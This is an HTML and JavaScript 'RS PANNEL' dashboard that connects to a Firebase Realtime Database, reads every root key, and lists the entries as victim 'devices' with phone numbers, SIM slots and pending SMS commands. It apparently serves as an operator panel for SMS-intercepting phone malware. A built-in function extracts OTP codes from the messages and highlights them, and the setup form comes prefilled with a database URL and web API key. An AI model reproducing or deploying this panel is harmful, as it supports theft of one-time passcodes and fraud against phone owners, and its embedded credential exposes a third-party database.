<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>RS PANNEL — Admin</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    :root {
      --bg: #0a0b0f;
      --card: #101216;
      --border: #1e2026;
      --text: #f0f0f2;
      --muted: #6b6f7a;
      --red: #ff3b30;
      --green: #00d68f;
      --cyan: #18bfff;
      --shadow: 0 18px 60px rgba(0,0,0,0.6);
    }
    body {
      background: var(--bg);
      color: var(--text);
      font-family: 'Inter', system-ui, sans-serif;
      min-height: 100vh;
      background-image: radial-gradient(circle at 70% 20%, rgba(255,50,50,0.08) 0%, transparent 50%),
                        radial-gradient(circle at 20% 80%, rgba(0,180,255,0.05) 0%, transparent 50%),
                        linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),
                        linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
      background-size: auto, auto, 40px 40px, 40px 40px;
    }
    ::-webkit-scrollbar { width: 6px; background: #0a0b0f; }
    ::-webkit-scrollbar-thumb { background: #282c35; border-radius: 12px; }

    .hidden { display: none !important; }

    /* HOME */
    .screen { min-height: 100vh; display: grid; place-items: center; padding: 20px; }
    .shell { width: min(100%, 520px); }
    .brand { text-align: center; }
    .brand .logo {
      width: 72px; height: 72px; border-radius: 20px;
      background: linear-gradient(145deg, #ff3328, #c92712);
      display: grid; place-items: center; margin: 0 auto 20px;
      box-shadow: 0 0 40px rgba(255,50,35,0.3);
    }
    .brand .logo svg { width: 36px; height: 36px; fill: none; stroke: #fff; stroke-width: 2.5; }
    .brand h1 { font-size: 38px; font-weight: 800; letter-spacing: -1px; }
    .brand h1 span { color: #18bfff; }
    .brand p { color: var(--muted); margin-top: 6px; font-size: 16px; }

    .card {
      background: rgba(16,18,22,0.94);
      border: 1px solid var(--border);
      border-radius: 28px;
      box-shadow: var(--shadow);
      backdrop-filter: blur(16px);
      padding: 28px;
      margin-top: 30px;
    }
    .card-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
    }
    .card-header h3 { font-weight: 700; font-size: 16px; }
    .card-header .badge {
      background: #202126;
      color: var(--muted);
      padding: 6px 14px;
      border-radius: 999px;
      font-size: 13px;
    }
    .connection-item {
      display: flex;
      align-items: center;
      gap: 12px;
      padding: 16px;
      background: #111216;
      border: 1px solid #26292f;
      border-radius: 18px;
      margin-bottom: 10px;
    }
    .connection-item .info { flex: 1; min-width: 0; }
    .connection-item .info .name { font-weight: 700; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
    .connection-item .info .date { color: var(--muted); font-size: 13px; margin-top: 4px; }
    .connection-item button {
      width: 36px; height: 36px; border-radius: 50%;
      border: 1px solid #30333b;
      background: #181a20;
      color: #aaa;
      display: grid;
      place-items: center;
      cursor: pointer;
    }
    .connection-item button.green { color: var(--green); border-color: #086b4d; }
    .connection-item button.red { color: #ff4c55; border-color: #4b2227; }
    .btn-new {
      width: 100%; padding: 15px; border: 1px dashed #34373f; border-radius: 18px;
      background: transparent; color: var(--muted); margin-top: 16px; cursor: pointer;
    }
    .btn-new:hover { border-color: #4f5360; color: #fff; }
    .footer-text { text-align: center; color: #3a3d45; font-size: 12px; margin-top: 30px; }

    /* SETUP */
    .form-card { padding: 30px; }
    .form-card .back { background: none; border: 0; color: #8b8e98; font-size: 22px; cursor: pointer; padding: 0; margin-bottom: 20px; }
    .form-card .title { font-size: 20px; font-weight: 750; margin-bottom: 26px; }
    .form-group { margin-bottom: 18px; }
    .form-group label { display: block; color: #8a8d96; font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 8px; }
    .form-group input {
      width: 100%; height: 52px; border: 1px solid #26292f; border-radius: 16px;
      background: #111216; color: #eee; padding: 0 16px; outline: none;
    }
    .form-group input:focus { border-color: #4b4e58; box-shadow: 0 0 0 3px rgba(255,255,255,0.03); }
    .form-actions { display: flex; gap: 12px; margin-top: 24px; }
    .form-actions .primary {
      flex: 1; border: 0; border-radius: 16px; padding: 15px;
      font-weight: 750; background: linear-gradient(90deg, #ff3027, #df3a08);
      color: #fff; box-shadow: 0 8px 25px rgba(255,49,30,0.18); cursor: pointer;
    }
    .form-actions .secondary {
      border: 0; border-radius: 16px; padding: 15px 20px;
      background: #202126; color: #8e919a; cursor: pointer;
    }
    .error-text { color: #ff656d; text-align: center; font-size: 14px; margin-top: 16px; }
    .notice {
      margin-top: 18px; padding: 12px 14px; border: 1px solid #2a2d34;
      border-radius: 14px; color: #858995; font-size: 12px; line-height: 1.5;
    }

    /* DASHBOARD */
    .dashboard { display: none; min-height: 100vh; }
    .topbar {
      height: 76px; border-bottom: 1px solid #1c1e23;
      background: rgba(10,11,15,0.94); backdrop-filter: blur(12px);
      display: flex; align-items: center; gap: 20px; padding: 0 24px;
      position: sticky; top: 0; z-index: 10;
    }
    .topbar .logo { display: flex; align-items: center; gap: 10px; font-weight: 800; letter-spacing: 3px; white-space: nowrap; }
    .topbar .logo .dot {
      width: 28px; height: 28px; border-radius: 8px;
      background: linear-gradient(145deg, #ff3a2e, #c62913);
      display: grid; place-items: center;
      box-shadow: 0 0 18px rgba(255,50,35,0.25);
    }
    .topbar .search { flex: 1; max-width: 420px; }
    .topbar .search input {
      height: 42px; border-radius: 14px; border: 1px solid #26292f;
      background: #111216; color: #eee; padding: 0 16px; width: 100%; outline: none;
    }
    .topbar .search input:focus { border-color: #4b4e58; }
    .topbar .actions { display: flex; align-items: center; gap: 12px; margin-left: auto; }
    .topbar .actions .status {
      padding: 8px 16px; border: 1px solid #0c4a38; border-radius: 999px;
      color: var(--green); background: #071d17; font-size: 13px; font-weight: 700;
      white-space: nowrap;
    }
    .topbar .actions button {
      background: #181a20; border: 1px solid #2a2d34; color: #aaa;
      border-radius: 12px; padding: 10px 14px; cursor: pointer;
    }
    .topbar .actions button:hover { background: #22262f; }
    .topbar .actions .logout { background: #181a20; border: 1px solid #2a2d34; color: #858994; }

    .statsbar {
      display: flex; gap: 32px; padding: 16px 26px;
      border-bottom: 1px solid #1b1d22; overflow-x: auto;
    }
    .stat-item { min-width: 70px; }
    .stat-item small { display: block; color: #555963; font-size: 10px; font-weight: 800; letter-spacing: 0.1em; }
    .stat-item strong { display: block; margin-top: 6px; font-size: 20px; }
    .stat-item .green { color: var(--green); }
    .stat-item .red { color: var(--red); }
    .stat-item .cyan { color: var(--cyan); }

    .filters {
      display: flex; gap: 8px; align-items: center; padding: 14px 26px; overflow-x: auto;
    }
    .filters .filter {
      background: transparent; border: 0; color: #666a74; padding: 8px 16px;
      border-radius: 12px; white-space: nowrap; cursor: pointer;
    }
    .filters .filter.active { background: #351518; color: #ff5c5d; border: 1px solid #86272c; }
    .filters .sort {
      margin-left: auto; background: #14161a; border: 1px solid #292b31;
      color: #777b86; padding: 8px 14px; border-radius: 12px; cursor: pointer;
    }

    .grid {
      display: grid;
      grid-template-columns: repeat(3, minmax(0, 1fr));
      gap: 16px;
      padding: 14px 26px 30px;
    }
    .device-card {
      background: #121316; border: 1px solid #292b30; border-radius: 18px;
      padding: 18px; min-height: 220px; cursor: pointer;
      transition: 0.15s ease;
    }
    .device-card:hover { border-color: #4b4e58; transform: translateY(-2px); box-shadow: 0 8px 30px rgba(0,0,0,0.4); }
    .device-card .top { display: flex; gap: 12px; align-items: flex-start; }
    .device-card .icon {
      width: 44px; height: 44px; border-radius: 14px; border: 1px solid #292b30;
      background: #1a1c20; display: grid; place-items: center; font-size: 20px; color: #555;
    }
    .device-card .icon.active { color: var(--green); border-color: #086b4d; background: #08251e; box-shadow: 0 0 18px rgba(0,214,143,0.12); }
    .device-card .info { flex: 1; min-width: 0; }
    .device-card .info .name { font-weight: 750; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
    .device-card .info .sub { font-size: 11px; color: #454850; margin-top: 4px; }
    .device-card .info .sub span { margin-right: 8px; }
    .device-card .details {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 16px;
      margin-top: 18px;
    }
    .device-card .details .item small {
      display: block; color: #4f525a; font-size: 10px; font-weight: 800; letter-spacing: 0.08em;
    }
    .device-card .details .item div {
      margin-top: 5px; color: #b7bac1; font-size: 13px;
      white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
    }
    .online-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: var(--green); box-shadow: 0 0 10px var(--green); margin-right: 6px; }
    .offline-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: #3a3c42; margin-right: 6px; }
    .empty-grid { grid-column: 1/-1; text-align: center; color: #666b75; padding: 70px 0; }

    /* MODAL */
    .modal-overlay {
      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(0,0,0,0.92); z-index: 9999; padding: 20px; overflow-y: auto;
      display: none;
    }
    .modal-overlay.active { display: block; }
    .modal-box {
      max-width: 900px; margin: 20px auto; background: #101115;
      border: 1px solid #24262d; border-radius: 28px; padding: 30px;
    }
    .modal-box .modal-header {
      display: flex; justify-content: space-between; align-items: center;
      border-bottom: 1px solid #1c1e23; padding-bottom: 18px; margin-bottom: 24px;
    }
    .modal-box .modal-header h2 { font-size: 24px; color: #fff; }
    .modal-box .modal-header .close {
      background: none; border: 0; color: #777; font-size: 32px; cursor: pointer;
    }
    .modal-box .modal-header .close:hover { color: #ff656d; }

    .detail-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 16px;
      margin-bottom: 24px;
    }
    .detail-item {
      padding: 14px; background: #0a0b0f; border-radius: 14px; border: 1px solid #1c1e23;
    }
    .detail-item .label { color: #555963; font-size: 11px; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 4px; }
    .detail-item .value { color: #eee; font-size: 15px; font-weight: 600; word-break: break-word; }

    .sms-section h3 {
      color: var(--muted); font-size: 13px; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 14px;
    }
    .sms-item {
      padding: 12px 16px; background: #0a0b0f; border: 1px solid #1c1e23;
      border-radius: 12px; margin-bottom: 8px;
    }
    .sms-item .sms-header { display: flex; justify-content: space-between; color: #555963; font-size: 11px; margin-bottom: 4px; }
    .sms-item .sms-body { color: #d4d4d8; font-size: 14px; word-break: break-word; }
    .sms-item .sms-otp {
      display: inline-block; background: #08251e; color: var(--green);
      font-weight: 700; font-size: 16px; padding: 2px 12px; border-radius: 6px; margin-top: 6px;
    }

    .toast {
      position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
      background: #1a1c22; border: 1px solid #2a2d34; padding: 14px 28px;
      border-radius: 18px; color: #eee; z-index: 99999;
      box-shadow: 0 18px 60px rgba(0,0,0,0.7); backdrop-filter: blur(12px);
      font-size: 14px; min-width: 220px; text-align: center;
      transition: opacity 0.3s ease;
    }
    .toast.error { border-color: #4b2227; color: #ff656d; }
    .toast.success { border-color: #086b4d; color: var(--green); }

    @media (max-width: 1050px) { .grid { grid-template-columns: repeat(2, 1fr); } }
    @media (max-width: 650px) {
      .topbar { padding: 0 14px; gap: 10px; flex-wrap: wrap; height: auto; padding: 12px 14px; }
      .topbar .logo { font-size: 13px; letter-spacing: 2px; }
      .topbar .search { max-width: 100%; order: 3; flex-basis: 100%; }
      .topbar .actions .status { display: none; }
      .grid { grid-template-columns: 1fr; padding: 10px 14px 25px; }
      .statsbar { padding: 12px 14px; gap: 16px; }
      .filters { padding: 10px 14px; }
      .modal-box { padding: 20px; }
      .brand h1 { font-size: 30px; }
      .detail-grid { grid-template-columns: 1fr; }
    }
  </style>
</head>
<body>

<div id="toast" class="toast hidden"></div>

<!-- HOME SCREEN -->
<section id="homeScreen" class="screen">
  <div class="shell">
    <div class="brand">
      <div class="logo">
        <svg viewBox="0 0 32 32"><path d="M16 3l10 4v7c0 7-4.3 12.2-10 15C10.3 26.2 6 21 6 14V7l10-4z"/><path d="M11 16l3 3 7-8"/></svg>
      </div>
      <h1>RS <span>PANNEL</span></h1>
      <p>Device Management</p>
    </div>
    <div class="card">
      <div class="card-header">
        <h3>◌ Saved Connections</h3>
        <span class="badge" id="connCount">0</span>
      </div>
      <div id="connectionsList"></div>
      <button class="btn-new" id="newConnBtn">＋ New Firebase Connection</button>
      <div id="homeError" class="error-text hidden"></div>
    </div>
    <div class="footer-text">RS PANNEL · v5.0 · Root Reader</div>
  </div>
</section>

<!-- SETUP SCREEN -->
<section id="setupScreen" class="screen hidden">
  <div class="shell">
    <div class="brand"><h1>RS <span>PANNEL</span></h1><p>Add Project</p></div>
    <div class="card form-card">
      <button class="back" id="backBtn">‹</button>
      <div class="title">New Firebase Connection</div>
      <div class="form-group">
        <label>Friendly Label</label>
        <input id="labelInput" placeholder="e.g. Pikachu" value="Pikachu">
      </div>
      <div class="form-group">
        <label>Database URL</label>
        <input id="urlInput" placeholder="https://project-default-rtdb.firebaseio.com" value="https://admin-panel-pikachu-default-rtdb.firebaseio.com">
      </div>
      <div class="form-group">
        <label>Web API Key</label>
        <input id="keyInput" type="password" placeholder="AIza..." value="AIzaSyCvVqCRv7qZQwYxItXwj8Nj1s4gFmpZ2I">
      </div>
      <div class="form-actions">
        <button class="primary" id="saveConnBtn">⚡ Connect</button>
        <button class="secondary" id="cancelBtn">Cancel</button>
      </div>
      <div id="setupError" class="error-text hidden"></div>
      <div class="notice">Reads root keys directly — works with any Firebase DB</div>
    </div>
  </div>
</section>

<!-- DASHBOARD -->
<section id="dashboardScreen" class="dashboard">
  <header class="topbar">
    <div class="logo"><div class="dot">RS</div> RS PANNEL</div>
    <div class="search"><input id="searchInput" placeholder="Search devices..."></div>
    <div class="actions">
      <span class="status" id="statusLabel">● Connected</span>
      <button id="refreshBtn">↻</button>
      <button class="logout" id="logoutBtn">Exit</button>
    </div>
  </header>
  <div class="statsbar">
    <div class="stat-item"><small>TOTAL</small><strong id="totalStat">0</strong></div>
    <div class="stat-item"><small>ACTIVE</small><strong class="green" id="activeStat">0</strong></div>
    <div class="stat-item"><small>PENDING SMS</small><strong class="cyan" id="smsStat">0</strong></div>
  </div>
  <div class="filters">
    <button class="filter active" data-filter="all">All</button>
    <button class="filter" data-filter="active">Active</button>
    <button class="filter" data-filter="inactive">Inactive</button>
    <button class="sort" id="sortBtn">Sort ▲</button>
  </div>
  <main class="grid" id="deviceGrid"></main>
</section>

<!-- DETAIL MODAL -->
<div id="detailModal" class="modal-overlay">
  <div class="modal-box">
    <div class="modal-header">
      <h2 id="detailDeviceName">Device</h2>
      <button class="close" id="detailClose">×</button>
    </div>
    <div class="detail-grid" id="detailGrid"></div>
    <div class="sms-section">
      <h3>📩 Pending Commands / SMS</h3>
      <div id="detailSmsList"></div>
    </div>
  </div>
</div>

<script>
// ─── SECURE STORAGE ──────────────────────────────────────────────────
const STORAGE_KEY = "rs_pannel_conns";
function getPass() {
  if (!window._sp) window._sp = Math.random().toString(36).slice(2,15) + Math.random().toString(36).slice(2,15);
  return window._sp;
}
function enc(t, p) { let r=''; for(let i=0;i<t.length;i++) r+=String.fromCharCode(t.charCodeAt(i)^p.charCodeAt(i%p.length)); return btoa(r); }
function dec(e, p) { try { const d=atob(e); let r=''; for(let i=0;i<d.length;i++) r+=String.fromCharCode(d.charCodeAt(i)^p.charCodeAt(i%p.length)); return r; } catch { return null; } }
function saveConns(d) { try { sessionStorage.setItem(STORAGE_KEY, enc(JSON.stringify(d), getPass())); } catch(e) {} }
function loadConns() { try { const e=sessionStorage.getItem(STORAGE_KEY); if(!e) return {connections:[]}; const d=dec(e, getPass()); if(!d) return {connections:[]}; return JSON.parse(d); } catch { return {connections:[]}; } }

// ─── HELPERS ──────────────────────────────────────────────────────────
const $ = id => document.getElementById(id);
function showToast(msg, type='success', dur=2000) {
  const t = $('toast');
  t.textContent = msg;
  t.className = `toast ${type}`;
  t.classList.remove('hidden');
  clearTimeout(t._h);
  t._h = setTimeout(() => t.classList.add('hidden'), dur);
}

// ─── NAVIGATION ──────────────────────────────────────────────────────
function showHome() {
  if (window._unsub) { try { window._unsub(); } catch(e) {}; window._unsub = null; }
  $('setupScreen').classList.add('hidden');
  $('dashboardScreen').style.display = 'none';
  $('homeScreen').classList.remove('hidden');
  renderConnections();
}
function showSetup() {
  $('homeScreen').classList.add('hidden');
  $('dashboardScreen').style.display = 'none';
  $('setupScreen').classList.remove('hidden');
  $('setupError').classList.add('hidden');
}
function showDashboard() {
  $('homeScreen').classList.add('hidden');
  $('setupScreen').classList.add('hidden');
  $('dashboardScreen').style.display = 'block';
}

// ─── CONNECTIONS ─────────────────────────────────────────────────────
function renderConnections() {
  const local = loadConns();
  const list = local.connections || [];
  $('connCount').textContent = `${list.length} connection${list.length===1?'':'s'}`;
  const container = $('connectionsList');
  container.innerHTML = '';
  if (!list.length) {
    container.innerHTML = '<div style="text-align:center;color:#555963;padding:16px 0;">No saved connections</div>';
    return;
  }
  list.forEach((c, i) => {
    const div = document.createElement('div');
    div.className = 'connection-item';
    div.innerHTML = `
      <div class="info">
        <div class="name">${c.label || 'Firebase Project'}</div>
        <div class="date">${new Date(c.created || Date.now()).toLocaleString()}</div>
      </div>
      <button class="green" data-index="${i}">↗</button>
      <button class="red" data-index="${i}">⌫</button>
    `;
    div.querySelectorAll('button').forEach(btn => {
      btn.addEventListener('click', function(e) {
        e.stopPropagation();
        const idx = parseInt(this.dataset.index);
        const localData = loadConns();
        if (this.classList.contains('green')) {
          connectSecure(localData.connections[idx]);
        } else {
          localData.connections.splice(idx, 1);
          saveConns(localData);
          renderConnections();
          showToast('Removed', 'success');
        }
      });
    });
    container.appendChild(div);
  });
}

// ─── FIREBASE CONNECTION ─────────────────────────────────────────────
let firebaseReady = false;
let devices = [];
let currentFilter = 'all';
let sortAsc = false;
let currentDetailId = null;

function connectSecure(conn) {
  try {
    const apiKey = dec(conn.apiKey, getPass());
    if (!apiKey) { showToast('Decryption failed', 'error'); return; }
    showDashboard();
    const status = $('statusLabel');
    status.textContent = '● Loading...';
    status.style.color = 'var(--yellow)';

    if (!firebaseReady) {
      const script = document.createElement('script');
      script.src = 'https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js';
      script.onload = () => {
        const dbScript = document.createElement('script');
        dbScript.src = 'https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js';
        dbScript.onload = () => {
          firebaseReady = true;
          initFirebase(conn, apiKey);
        };
        document.head.appendChild(dbScript);
      };
      script.onerror = () => { showToast('SDK load failed', 'error'); status.textContent='● Error'; status.style.color='var(--danger)'; };
      document.head.appendChild(script);
    } else {
      initFirebase(conn, apiKey);
    }
  } catch(e) { showToast('Connection error','error'); }
}

function initFirebase(conn, apiKey) {
  try {
    if (window._unsub) { try { window._unsub(); } catch(e) {}; window._unsub = null; }
    if (firebase.apps.length) firebase.apps.forEach(app => app.delete());
    firebase.initializeApp({ apiKey, databaseURL: conn.databaseURL });
    const db = firebase.database();
    const status = $('statusLabel');

    // ─── LISTEN TO ROOT ──────────────────────────────────────────────
    const rootRef = db.ref('/');
    const listener = rootRef.on('value', (snapshot) => {
      const data = snapshot.val();
      if (!data || typeof data !== 'object') {
        devices = [];
        renderGrid();
        status.textContent = '● No data';
        status.style.color = 'var(--danger)';
        return;
      }

      // Convert root keys into device list
      devices = Object.entries(data).map(([id, node]) => {
        // Extract phone number if present
        let phone = node.phoneNumber || node.number || node.phone || '';
        // Check for sms/pending command
        let pendingSms = null;
        let simSlot = null;
        let command = node.command || node.sms || {};
        if (command.messageText || command.message || command.body) {
          pendingSms = command.messageText || command.message || command.body;
          simSlot = command.simSlot || command.sim || 0;
        } else if (node.sms && node.sms.status === 'pending') {
          pendingSms = node.sms.messageText || node.sms.message || '';
          simSlot = node.sms.simSlot || 0;
        }
        // Also check webhookEvent
        if (!pendingSms && node.webhookEvent && node.webhookEvent.sendSms) {
          const s = node.webhookEvent.sendSms;
          pendingSms = s.messageText || s.message || s.body || '';
          simSlot = s.simSlot || s.sim || 0;
        }

        return {
          id,
          phone: phone || 'N/A',
          pendingSms: pendingSms || null,
          simSlot: simSlot !== null ? simSlot : 'N/A',
          hasPending: !!pendingSms,
          raw: node,
          // treat as active if has pending or phone exists
          active: !!pendingSms || !!phone
        };
      });

      status.textContent = `● Connected (${devices.length} devices)`;
      status.style.color = 'var(--green)';
      renderGrid();
      showToast(`Loaded ${devices.length} devices`, 'success', 1500);
    }, (error) => {
      console.error('Firebase read error:', error);
      status.textContent = '● Error';
      status.style.color = 'var(--danger)';
      showToast('Permission denied or invalid DB', 'error');
    });

    window._unsub = () => rootRef.off('value', listener);
  } catch(e) {
    console.error('Init error:', e);
    showToast('Init failed', 'error');
  }
}

// ─── SAVE CONNECTION ─────────────────────────────────────────────────
$('saveConnBtn').addEventListener('click', () => {
  const label = $('labelInput').value.trim() || 'Firebase Project';
  const url = $('urlInput').value.trim().replace(/\/$/, '');
  const key = $('keyInput').value.trim();
  const err = $('setupError');
  err.classList.add('hidden');
  if (!url || !key) { err.textContent = 'URL and API Key required.'; err.classList.remove('hidden'); showToast('Missing fields','error'); return; }
  const conn = { label, databaseURL: url, apiKey: enc(key, getPass()), created: Date.now() };
  const local = loadConns();
  local.connections = local.connections.filter(c => c.databaseURL !== url);
  local.connections.unshift(conn);
  saveConns(local);
  connectSecure(conn);
});

// ─── EVENTS ───────────────────────────────────────────────────────────
$('newConnBtn').addEventListener('click', showSetup);
$('backBtn').addEventListener('click', showHome);
$('cancelBtn').addEventListener('click', showHome);
$('logoutBtn').addEventListener('click', showHome);
$('refreshBtn').addEventListener('click', () => {
  const local = loadConns();
  if (local.connections.length) connectSecure(local.connections[0]);
  else showToast('No connection','error');
});

// ─── DETAIL MODAL ──────────────────────────────────────────────────
$('detailClose').addEventListener('click', () => $('detailModal').classList.remove('active'));
$('detailModal').addEventListener('click', function(e) { if (e.target === this) this.classList.remove('active'); });

// ─── FILTERS ─────────────────────────────────────────────────────────
document.querySelectorAll('.filter').forEach(btn => {
  btn.addEventListener('click', function() {
    currentFilter = this.dataset.filter;
    document.querySelectorAll('.filter').forEach(b => b.classList.remove('active'));
    this.classList.add('active');
    renderGrid();
  });
});
$('sortBtn').addEventListener('click', function() {
  sortAsc = !sortAsc;
  this.textContent = sortAsc ? 'Sort ▼' : 'Sort ▲';
  renderGrid();
});
$('searchInput').addEventListener('input', renderGrid);

// ─── RENDER GRID ──────────────────────────────────────────────────────
function renderGrid() {
  const q = $('searchInput').value.toLowerCase();
  let list = devices.filter(d => {
    const filterOk = currentFilter === 'all' ||
                     (currentFilter === 'active' && d.active) ||
                     (currentFilter === 'inactive' && !d.active);
    const searchOk = (d.id + ' ' + d.phone).toLowerCase().includes(q);
    return filterOk && searchOk;
  });
  list.sort((a,b) => {
    const aTime = a.raw?.timestamp || a.raw?.lastSeen || 0;
    const bTime = b.raw?.timestamp || b.raw?.lastSeen || 0;
    return sortAsc ? aTime - bTime : bTime - aTime;
  });

  $('totalStat').textContent = devices.length;
  $('activeStat').textContent = devices.filter(d => d.active).length;
  $('smsStat').textContent = devices.filter(d => d.hasPending).length;

  const grid = $('deviceGrid');
  grid.innerHTML = '';
  if (!list.length) {
    grid.innerHTML = '<div class="empty-grid">No devices found</div>';
    return;
  }
  list.forEach(d => {
    const card = document.createElement('div');
    card.className = 'device-card';
    const hasPending = d.hasPending;
    card.innerHTML = `
      <div class="top">
        <div class="icon ${hasPending ? 'active' : ''}">${hasPending ? '◉' : '◌'}</div>
        <div class="info">
          <div class="name">${d.id.slice(0, 16)}</div>
          <div class="sub"><span>📞 ${d.phone}</span>${hasPending ? ' · 📩 pending' : ''}</div>
        </div>
      </div>
      <div class="details">
        <div class="item"><small>ID</small><div>${d.id.slice(0, 8)}…</div></div>
        <div class="item"><small>STATUS</small><div>${hasPending ? '<span class="online-dot"></span>Pending' : '<span class="offline-dot"></span>Idle'}</div></div>
        <div class="item"><small>SIM</small><div>${d.simSlot}</div></div>
        <div class="item"><small>MESSAGE</small><div>${d.pendingSms ? d.pendingSms.slice(0, 20) + (d.pendingSms.length > 20 ? '…' : '') : '—'}</div></div>
      </div>
    `;
    card.addEventListener('click', () => showDetail(d));
    grid.appendChild(card);
  });
}

// ─── DETAIL VIEW ──────────────────────────────────────────────────────
function showDetail(device) {
  currentDetailId = device.id;
  const modal = $('detailModal');
  modal.classList.add('active');
  $('detailDeviceName').textContent = `Device: ${device.id.slice(0, 20)}`;

  const grid = $('detailGrid');
  grid.innerHTML = `
    <div class="detail-item"><div class="label">📱 ID</div><div class="value">${device.id}</div></div>
    <div class="detail-item"><div class="label">📞 Phone</div><div class="value">${device.phone}</div></div>
    <div class="detail-item"><div class="label">📶 Status</div><div class="value" style="color:${device.hasPending ? 'var(--green)' : 'var(--red)'}">${device.hasPending ? 'Pending SMS' : 'Idle'}</div></div>
    <div class="detail-item"><div class="label">📲 SIM Slot</div><div class="value">${device.simSlot}</div></div>
  `;

  const smsList = $('detailSmsList');
  smsList.innerHTML = '';
  if (device.pendingSms) {
    const div = document.createElement('div');
    div.className = 'sms-item';
    div.innerHTML = `
      <div class="sms-header"><span>📨 Pending Command</span><span>SIM ${device.simSlot}</span></div>
      <div class="sms-body">${device.pendingSms}</div>
      ${extractOTP(device.pendingSms) ? `<div class="sms-otp">🔑 OTP: ${extractOTP(device.pendingSms)}</div>` : ''}
    `;
    smsList.appendChild(div);
  } else {
    smsList.innerHTML = '<div style="color:#555963;padding:12px 0;">No pending commands</div>';
  }
}

function extractOTP(text) {
  if (!text) return null;
  const m = text.match(/\b\d{4,8}\b/g);
  if (m) return m.sort((a,b) => a.length - b.length)[0];
  return null;
}

renderConnections();
console.log('[RS PANNEL] Ready — root reader');
